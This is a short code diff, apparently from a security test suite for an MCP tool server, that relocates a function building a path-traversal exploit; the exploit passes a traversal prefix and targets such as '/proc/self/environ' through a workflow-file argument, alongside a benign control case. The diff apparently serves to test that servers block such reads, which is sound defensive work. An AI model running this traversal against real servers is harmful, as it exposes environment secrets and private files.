@@ -78,6 +78,14 @@ KEPT_PLACES: tuple[str, ...] = (
 )
 
 
+def _make_exploit(place_id: str):
+    async def exploit(places: Places, client: MCPClientPort) -> None:
+        target = _read_target(places[place_id])
+        await client.call_tool(TOOL, _bundle_args(TRAVERSAL + target.lstrip("/")))
+
+    return exploit
+
+
 def _read_target(place: Place) -> str:
     if place.kind is PlaceKind.ENV:
         return "/proc/self/environ"
@@ -99,14 +107,6 @@ def _bundle_args(main_workflow_file: str) -> dict[str, object]:
         "workflow_format": "wdl",
         "main_workflow_file": main_workflow_file,
     }
-
-
-def _make_exploit(place_id: str):
-    async def exploit(places: Places, client: MCPClientPort) -> None:
-        target = _read_target(places[place_id])
-        await client.call_tool(TOOL, _bundle_args(TRAVERSAL + target.lstrip("/")))
-
-    return exploit
 
 
 async def _benign(places: Places, client: MCPClientPort) -> None:
